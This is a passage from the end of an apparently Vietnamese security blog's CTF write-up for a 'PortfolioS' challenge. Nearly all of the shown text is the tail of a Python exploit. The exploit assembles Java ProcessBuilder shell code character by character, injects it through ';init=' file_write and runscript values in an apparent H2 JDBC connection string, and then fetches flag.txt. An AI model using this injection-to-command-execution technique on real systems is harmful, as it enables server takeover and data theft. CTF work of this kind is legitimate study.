class="p">,</span><span class="s1">&#39;j&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;P&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="s1">&#39;u&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;h&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;*&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;f&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;f&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39;\;&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="s1">&#39;\;&#39;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;L&#39;</span><span class="p">,</span><span class="s1">&#39;L&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39;\;&#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">send</span><span class="p">(</span><span class="s2">&#34;sa&#34;</span><span class="p">,</span><span class="sa">f</span><span class="s2">&#34;;init=call file_write(file_read(&#39;call.txt&#39;,&#39;UTF-8&#39;)||&#39;</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s2">&#39;,&#39;call.txt&#39;)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="s1">&#39;sa&#39;</span><span class="p">,</span><span class="s2">&#34;;init=runscript+from+&#39;call.txt&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;download/flag.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
            </div>
        
            <div class="article-footer mt-5 pt-4" style="font-size: smaller;">
                <p>Thanks for your reading!</p>
                <p>© 2026 <strong>izcuyt.com</strong>. Some rights reserved.</p>
            </div>
        </article>
        <aside class="main-content__article-panel col-3">
            
            
            <div class="main-content__article-panel-same-category-post">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-regular fa-newspaper"></i>Related articles
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2025/12/file-upload-challenge/" title="File Upload Challenge">
                                <span class="main-content__article-panel-item-text">File Upload Challenge</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2025/12/tim-hieu-ve-sql-injection-va-cach-phong-chong/" title="Tìm hiểu về SQL injection và cách phòng chống">
                                <span class="main-content__article-panel-item-text">Tìm hiểu về SQL injection và cách phòng chống</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            

            <div class="main-content__article-panel-categories">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-solid fa-hashtag"></i> Categories
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/ctf">
                                
                                <span class="main-content__article-panel-item-text">CTF</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/file-uploads-vulnerabilities">
                                
                                <span class="main-content__article-panel-item-text">File Uploads Vulnerabilities</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/security">
                                
                                <span class="main-content__article-panel-item-text">Security</span>
                                <span class="main-content__article-panel-item-text cat-count">(3)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/sql">
                                
                                <span class="main-content__article-panel-item-text">SQL</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/web">
                                
                                <span class="main-content__article-panel-item-text">Web</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/writeups">
                                
                                <span class="main-content__article-panel-item-text">Writeups</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                </ul>
            </div>

            
                <div class="main-content__article-panel-toc">
                    <h3 class="main-content__article-panel-heading">
                        <i class="fa-regular fa-rectangle-list"></i>Contents
                    </h3>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#zc-1">ZC-1</a></li>
    <li><a href="#portfolios">PortfolioS</a></li>
  </ul>
</nav>
                </div>
            

        </aside>
    </div>

        </div>

        <footer id="main-footer" class="pt-4 pb-4">
    <div class="container container-narrow border-top pt-5">
        <div class="row">
            <div class="col-lg-5">
                <div class="footer-brand">
                    <h2 class="footer-brand__name">>_ izcuyt.com</h2>
                    <p class="footer-brand__desc">
                        Aspiring Web Pentester<br>Sharing security knowledge about Cyber Security.
                        <br><br>
                        Made by <b>@cuyt</b> with love. ♥️
                    </p>
                </div>
                <div class="footer-socials mt-4">
                    <a href="https://www.facebook.com/100024860571867" target="_blank" class="footer-social-btn"><i class="fa-brands fa-facebook-f"></i></a>
                    <a href="https://www.instagram.com/koanbunbo/" target="_blank" class="footer-social-btn"><i class="fa-brands fa-instagram"></i></a>
                    <a href="https://github.com/quyt0" target="_blank" class="footer-social-btn"><i class="fa-brands fa-github"></i></a>
                    <a href="https://www.linkedin.com/in/doanduyphuc/" target="_blank" class="footer-social-btn"><i class="fa-brands fa-linkedin-in"></i></a>
                    <a href="mailto:dphuc2304@gmail.com" target="_blank" class="footer-social-btn"><i class="fa-solid fa-envelope"></i></a>
                </div>
            </div>

            <div class="col-lg-1 d-none d-lg-block">
                <div class="footer-divider"></div>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">This site</h3>
                <ul class="footer-list">
                    <li><a href="/">Blog</a></li>
                    <li><a href="/categories">Categories</a></li>
                    <li><a href="/archives">Archives</a></li>
                </ul>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">Connect</h3>
                <ul class="footer-list">
                    <li><a href="/cv">Resume</a></li>
                    <li><a href="mailto:dphuc2304@gmail.com">Email</a></li>
                </ul>
            </div>
        </div>
    </div>
</footer>
    </div>
    <div id="lightbox-overlay" class="lightbox-overlay">
        <span class="lightbox-close">&times;</span>
        <img class="lightbox-content" id="lightbox-img">
        <div id="lightbox-caption"></div>
    </div>
    
    <script src="/js/script.min.cf337e7bc69f8ff9a3b5823552a295a01d595a204a8fc3aa3844a7e263db823e.js" integrity="sha256-zzN&#43;e8afj/mjtYI1UqKVoB1ZWiBKj8OqOESn4mPbgj4=" defer></script>
</body>
</html>